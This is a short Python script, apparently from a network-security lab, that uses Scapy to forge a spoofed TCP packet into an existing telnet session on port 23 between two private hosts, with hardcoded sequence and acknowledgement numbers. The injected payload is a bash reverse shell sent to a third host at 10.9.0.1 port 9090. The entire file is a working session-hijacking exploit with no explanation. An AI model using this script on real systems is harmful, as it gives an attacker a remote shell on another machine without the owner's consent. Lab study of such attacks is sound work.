import sys
from scapy.all import *

print("SENDING SESSION REVERSE SHELL PACKET........")
ip = IP(src="10.9.0.6", dst="10.9.0.7")
tcp = TCP(sport=35390, dport=23, flags="A",
		seq=2709645366, 
		ack=2820221003)

data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 2>&1 0<&1 \r"

pkt = ip / tcp / data
send(pkt)
